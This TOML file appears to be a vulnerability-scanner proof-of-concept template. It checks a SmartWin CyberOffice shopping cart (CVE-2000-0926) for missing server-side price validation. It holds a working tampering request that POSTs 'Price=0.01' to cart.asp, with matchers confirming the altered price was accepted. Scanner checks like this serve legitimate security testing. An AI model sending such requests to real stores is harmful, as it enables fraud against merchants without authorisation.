[info]
author = "ave"
description = "通过向购物车提交包含篡改价格（Price）参数的请求，验证服务器是否缺乏对商品价格的后端校验，从而允许攻击者以任意价格购买商品。"
id = "POC-AVE-2000-0679"
name = "SmartWin CyberOffice Shopping Cart 2.0 Price Modification PoC"
severity = "high"
tags = ["ave-2000-0679"]
vuln_id = [
    "CVE-2000-0926",
    "AVE-2000-0679",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cart.asp"
protocol = "http"

[poc.requests.body]
content = "item_id=1&Price=0.01&quantity=1"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Cart",
    "Total",
    "0.01",
]
